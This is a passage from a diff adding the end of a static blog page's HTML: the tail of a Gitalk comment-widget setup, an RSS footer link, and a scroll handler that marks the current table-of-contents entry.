+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="https://le1a.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
